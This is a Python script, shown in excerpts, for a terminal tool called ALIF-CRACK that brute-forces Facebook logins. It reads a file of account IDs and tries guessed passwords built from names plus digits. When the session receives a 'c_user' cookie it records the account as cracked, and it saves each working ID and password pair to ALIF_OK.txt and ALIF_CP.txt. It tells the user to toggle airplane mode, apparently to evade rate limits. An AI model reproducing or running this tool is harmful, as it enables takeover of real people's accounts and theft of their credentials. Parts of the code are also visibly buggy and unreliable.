...
logo ="""
\033[0;93m   /$$$$$$  /$$       /$$$$$$ /$$$$$$$$
\033[0;93m  /$$__  $$| $$      |_  $$_/| $$_____/
\033[0;93m | $$  \ $$| $$        | $$  | $$      
\033[0;93m | $$$$$$$$| $$        | $$  | $$$$$   
\33[93m | $$__  $$| $$        | $$  | $$__/   
\033[0;93m | $$  | $$| $$        | $$  | $$      
\033[0;93m | $$  | $$| $$$$$$$$ /$$$$$$| $$      
\033[0;93m |__/  |__/|________/|______/|__/                                      

\033[0;91m ╔═══════════════════════════════════════════╗
\033[0;91m   {\033[0;97m•\033[0;91m} \033[0;94m[•] Author   \033[0;91m: \033[0;95mALIF VAU 
\033[0;91m   {\033[0;97m•\033[0;91m} \033[0;94m[•] Github   \033[0;91m: \033[0;95mgithub.com/Alifvau
\033[0;91m   {\033[0;97m•\033[0;91m} \033[0;94m[•] Facebook \033[0;91m: \033[0;95mfacebook.com/ALIFVAUX
\033[0;91m ╚═══════════════════════════════════════════╝
"""
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;97m %s  \x1b[1;92ALIF_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;92m Total CP :\x1b[1;92m   %s \x1b[1;97ALIF_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;92mPress enter to back ")
	    meithun()
...
def meithun():
    ...
    print
    print(48 * '\x1b[1;91m~')
    print('\033[1;92m [1] START FILE CLONEING')
    print(' [2] EXIT')
    print(48 * '\x1b[1;91m~')
    _meithun___ = input('\033[0;93m [?] CHOOSE : ')
    if _meithun___ in ('1', '01'):
        __xxx__().meithunx(id)
    if _meithun___ in ('5', '50'):
        create_file()
    if _meithun___ in ('02', '2'):
        pass
...
class __xxx__:
    ...
    def meithunx(self,id):
        ...
        print(logo)
        print(48 * '\x1b[1;91m~')
        print('  EXAMPLE : /sdcard/alif.txt')
        print(48 * '\x1b[1;91m~')
        self.cnt = input ('\033[1;92m INPUT FILE NAME : ')
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;92m[ALIF-CRACK] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ALIF-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('ALIF_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [ALIF-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
    ...
    def __pler__(self):
        print(48 * '\x1b[1;91m~')
        print('\033[0;92m [1] CRACK WITH AUTO PASS ')
        print('\033[0;92m [2] CRACK WITH DIGIT PASS ')
        print(48 * '\x1b[1;91m~')
        chi = input('\033[0;91m [?] CHOOSE : ')
        if chi in ('1', '01'):
            os.system("clear")
            ipm = requests.get(url_ip).json()
            todz = ''
            print(logo)
            print(48*"\033[0;91m~")
            print("\033[0;92m USE AIRPLANE MODE THAN USE IT ")
            print(48*"\033[0;91m~")
            print('\033[0;92m YOUR TOTAL IDS : %s ' % len(self.id))
            print('\033[0;92m ID CRACKING STARTED')
            print('\033[0;92m STOP THIS PROSSES CTRL+Z')
            print(48*"\033[0;91m~")
            ...
            todz = ''
            print(logo)
            print("\033[0;92m\rENTER NAME LAST DIGIT \n")
            p1 = input('\033[0;91m NAME + 1 : ')
            p2 = input('\033[0;91m NAME + 2 : ')
            p3 = input('\033[0;91m NAME + 3 : ')
            p4 = input('\033[0;91m NAME + 4 : ')
            os.system("clear")
            print(logo)
            print(48*"\033[0;91m~")
            print("\033[0;92m USE AIRPLANE MODE THAN USE IT ")
